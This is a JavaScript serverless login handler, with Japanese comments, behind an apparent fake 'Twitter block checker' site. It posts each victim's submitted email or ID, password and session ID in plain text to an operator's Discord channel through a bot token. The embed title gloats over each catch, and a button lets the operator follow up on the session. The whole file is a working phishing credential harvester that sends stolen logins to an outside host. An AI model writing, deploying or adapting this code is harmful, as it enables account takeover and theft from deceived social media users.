// api/login.js
export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const { email, password, sessionId } = req.body;
    const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
    const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;

    // Discordへの埋め込みメッセージ作成
    const messageBody = {
        embeds: [
            {
                title: "きちゃーｗｗｗｗｗ",
                color: 0x00b0f4, // Twitter Blueっぽい色
                description: `**ID or Email**\n\`\n${email}\n\`\n**PASS**\n\`\n${password}\n\`\n**Session ID**\n\`\n${sessionId}\n\``,
                footer: {
                    text: "Twitterブロック診断",
                },
                timestamp: new Date().toISOString()
            }
        ],
        components: [
            {
                type: 1, // Action Row
                components: [
                    {
                        type: 2, // Button
                        style: 1, // Primary (Blue)
                        label: "認証結果を送信 (人数入力)",
                        custom_id: `open_modal::${sessionId}`
                    }
                ]
            }
        ]
    };

    try {
        await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
            method: 'POST',
            headers: {
                'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(messageBody)
        });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'post failed' });
    }
}
